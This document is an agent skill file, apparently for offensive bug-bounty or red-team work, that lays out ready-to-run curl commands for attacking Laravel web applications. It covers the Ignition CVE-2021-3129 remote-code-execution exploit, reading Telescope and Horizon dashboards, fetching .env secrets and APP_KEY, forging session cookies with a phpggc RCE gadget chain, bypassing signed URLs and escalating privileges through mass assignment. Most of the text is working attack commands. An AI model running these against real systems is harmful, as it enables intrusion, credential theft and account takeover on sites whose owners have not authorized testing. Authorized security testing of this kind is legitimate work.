---
name: hunt-laravel
description: Hunt Laravel specific vulnerabilities — Debug mode leakage (APP_DEBUG=true exposes full stack trace + env vars), Laravel Telescope/Horizon dashboard unauthorized access, Ignition RCE (CVE-2021-3129), Signed URL manipulation, Queue Worker abuse, mass assignment via Eloquent, deserialization via cookies, .env file exposure. Use when target runs Laravel (PHP) — detected via X-Powered-By, Laravel session cookies, or /storage/ paths.
version: 1.1.0
revision_date: 2026-07-25
license: MIT
category: redteam
tags: [laravel, hunt, redteam, php]
---

# HUNT-LARAVEL — Laravel Specific Vulnerabilities

## Crown Jewel Targets

Laravel debug mode enabled in production = instant RCE via Ignition (CVE-2021-3129).

**Highest-value findings:**
- **Ignition RCE (CVE-2021-3129)** — `APP_DEBUG=true` + Laravel < 8.4.2 → `/_ignition/execute-solution` RCE without auth
- **Telescope dashboard** — `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables
- **Horizon dashboard** — `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)
- **Signed URL manipulation** — if `URL::signedRoute` validates wrong params → bypass signed URL → unauthorized actions
- **.env exposure** — `APP_KEY` leaked → decrypt all encrypted cookies → forge session → ATO

---

## Phase 1 — Fingerprint Laravel

```bash
# Laravel-specific indicators
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "laravel_session\|x-powered-by.*php"
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -i "laravel\|Illuminate\|csrf-token"

# Common Laravel paths
for path in /storage /public /resources "/vendor/laravel" "/.env" "/artisan"; do
  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done

# Check error page (trigger 404)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoops\|Ignition\|symfony"
```

---

## Phase 2 — Debug Mode & Ignition RCE (CVE-2021-3129)

```bash
# Step 1: Check if debug mode is enabled (Whoops error page)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/nonexistent" | grep -i "Whoops\|APP_DEBUG\|Ignition"

# If Whoops/Ignition is visible → debug mode ON → test CVE-2021-3129

# Step 2: Check Ignition endpoint
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_ignition/health-check" | head -5

# Step 3: CVE-2021-3129 — Laravel < 8.4.2 RCE via log file manipulation
# (Requires debug mode + writable storage/logs)
# Tool: ambionics/laravel-ignition-rce
git clone https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce
php /tmp/laravel-rce/exploit.php https://$TARGET "id"

# Manual test — send solution request
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
      "variableName": "x",
      "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
    }
  }'
```

---

## Phase 3 — Laravel Telescope & Horizon

```bash
# Telescope — request/response logs, DB queries, jobs, cache, events
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope" | grep -i "telescope\|laravel"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/requests" | python3 -m json.tool 2>/dev/null | head -50
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/commands" | python3 -m json.tool 2>/dev/null | head -30
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/redis" | python3 -m json.tool 2>/dev/null | head -30
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/environment" | python3 -m json.tool 2>/dev/null | head -50

# Horizon — queue worker dashboard
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/horizon" | grep -i "horizon\|laravel"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/horizon/api/stats" | python3 -m json.tool 2>/dev/null
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/horizon/api/jobs/failed" | python3 -m json.tool 2>/dev/null | head -50
# Failed job payloads often contain full request data including auth tokens

# Common paths
for path in /telescope /telescope/requests /telescope/api /horizon /horizon/api/stats; do
  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" = "200" ] && echo "[+] ACCESSIBLE: $TARGET$path"
done
```

---

## Phase 4 — .env File & APP_KEY Exposure

```bash
# Direct .env access
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env" | grep -i "APP_KEY\|DB_PASSWORD\|SECRET\|KEY"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env.production"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env.backup"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env.local"

# If APP_KEY found:
APP_KEY="base64:XXXXXXX"
echo "APP_KEY=$APP_KEY"
# → Can decrypt all Laravel encrypted cookies
# → Can forge session cookies → ATO for any user

# Also check
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "exception\|error\|key\|password"
```

---

## Phase 5 — Signed URL Manipulation

```bash
# Laravel signed URLs contain signature param: ?signature=HASH
# Find signed URL endpoints
cat recon/$TARGET/urls.txt | grep "signature="

# Test: modify a non-signature parameter — should fail validation
SIGNED_URL="https://$TARGET/unsubscribe?user=123&email=test@test.com&signature=VALID_SIG"

# Modify user ID → should fail if properly signed
curl --max-time 30 --connect-timeout 10 -s "${SIGNED_URL/user=123/user=999}"

# Test signature bypass: remove signature entirely
curl --max-time 30 --connect-timeout 10 -s "${SIGNED_URL/&signature=VALID_SIG/}"

# Test: does the app validate ALL parameters or just some?
curl --max-time 30 --connect-timeout 10 -s "${SIGNED_URL}&extra=malicious"
```

---

## Phase 6 — Mass Assignment via Eloquent

```bash
# Laravel Eloquent ORM — if model uses $guarded=[] or $fillable=[] improperly
# Test: add extra fields to update/create requests

# Profile update
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/profile" \
  -H "Cookie: laravel_session=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@test.com", "is_admin": true, "role": "admin"}'

# Registration
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@[DOMAIN_EXAMPLE]", "password": "test123", "verified": true, "admin": 1}'
```

---

## Phase 7 — Laravel Cookie Deserialization

```bash
# If APP_KEY is known, forge a session cookie with malicious serialized payload
# Uses phpggc gadget chains

# Get the app key
APP_KEY=$(curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env" | grep "^APP_KEY=" | cut -d= -f2)

# Generate payload with phpggc
php phpggc Laravel/RCE5 system 'id' | base64

# Sign the cookie with the app key using laravel-cookie-forge script
# python3 laravel_cookie_forge.py --key "$APP_KEY" --payload "PHPGGC_PAYLOAD"
```

---

## Chain Table

| Laravel finding | Chain to | Impact |
|----------------|----------|--------|
| Debug mode ON | CVE-2021-3129 Ignition RCE | Critical RCE |
| Telescope accessible | Read API keys, DB queries, env vars | High - credential theft |
| Horizon accessible | Read failed job payloads | High - PII/token exfil |
| .env exposed with APP_KEY | Forge session cookie → ATO | Critical ATO |
| Signed URL bypass | Unauthorized actions (unsubscribe any user, etc.) | Medium-High |
| Mass assignment | Set is_admin=true → privilege escalation | Critical |

---

## Verification
✅ Ignition RCE: `id` command output returned in response
✅ Telescope: API responses contain DB queries with credentials or user tokens
✅ APP_KEY: Forged session cookie accepted, returns another user's profile
✅ Mass assignment: `is_admin: true` accepted, account now has admin privileges

**Severity:**
- Ignition RCE: Critical
- Telescope/Horizon with sensitive data: High
- .env with APP_KEY: Critical
- Mass assignment to admin: Critical

---

## Pitfalls
- **APP_KEY exposure without exploit** — knowing the APP_KEY enables cookie decryption and signing. Demonstrate forged session cookie or decrypted data.
- **Debug mode without sensitive output** — `APP_DEBUG=true` showing stack traces is Low. Need credentials or secrets in the debug output.
- **.env exposure without database credentials** — exposed `.env` with only `APP_NAME=...` is informational. Need DB creds, API keys, or secrets.
- **Telescope/Horizon without auth** — these tools expose queue/cache/request data. Demonstrate access to sensitive data through them.
